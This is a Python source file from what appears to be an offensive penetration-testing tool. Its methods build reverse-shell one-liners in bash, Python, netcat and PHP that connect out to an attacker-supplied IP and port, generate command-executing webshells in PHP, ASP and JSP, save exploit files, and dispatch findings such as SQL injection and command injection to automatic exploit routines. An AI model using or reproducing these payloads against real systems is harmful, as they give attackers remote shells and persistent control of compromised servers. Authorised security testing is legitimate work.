"""Utility helpers for payload generation and exploit dispatch."""

from pathlib import Path

from .models import ExploitResult, Payload


class UtilityMixin:
    """Provide payload generation and exploit routing methods."""

    def generate_reverse_shell(self, ip: str, port: int, language: str = "bash") -> Payload:
        """Generate a reverse shell payload."""
        payloads = {
            "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            "python": (
                "python -c 'import socket,subprocess,os;"
                "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                f's.connect(("{ip}",{port}));'
                "os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
                'p=subprocess.call(["/bin/sh","-i"]);\''
            ),
            "nc": f"nc -e /bin/sh {ip} {port}",
            "php": (f'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\''),
        }
        return Payload(
            name=f"reverse_shell_{language}",
            content=payloads.get(language, payloads["bash"]),
            parameters={"ip": ip, "port": port},
        )

    def generate_webshell(self, language: str = "php") -> Payload:
        """Generate a simple webshell."""
        shells = {
            "php": "<?php system($_GET['cmd']); ?>",
            "asp": (
                '<% Response.Write(CreateObject("WScript.Shell").Exec('
                'Request("cmd")).StdOut.ReadAll()) %>'
            ),
            "jsp": '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
        }
        return Payload(
            name=f"webshell.{language}",
            content=shells.get(language, shells["php"]),
            content_type="text/plain",
        )

    def save_exploit(self, name: str, content: str) -> Path:
        """Save an exploit to the project exploits folder."""
        if not self.exploit_dir:
            raise ValueError("No project directory set")
        exploit_file = self.exploit_dir / name
        exploit_file.write_text(content)
        return exploit_file

    async def auto_exploit(
        self,
        target: str,
        finding_type: str,
        parameter: str,
        **kwargs,
    ) -> ExploitResult:
        """Automatically exploit a known vulnerability type."""
        exploit_methods = {
            "sql_injection": self.exploit_sql_injection,
            "xss": self.exploit_xss,
            "path_traversal": self.exploit_path_traversal,
            "command_injection": self.exploit_command_injection,
        }
        method = exploit_methods.get(finding_type.lower())
        if not method:
            return ExploitResult(
                success=False,
                title=f"Unknown exploit type: {finding_type}",
                target=target,
                technique="unknown",
                error=f"No exploit method for {finding_type}",
            )
        return await method(target, parameter, **kwargs)
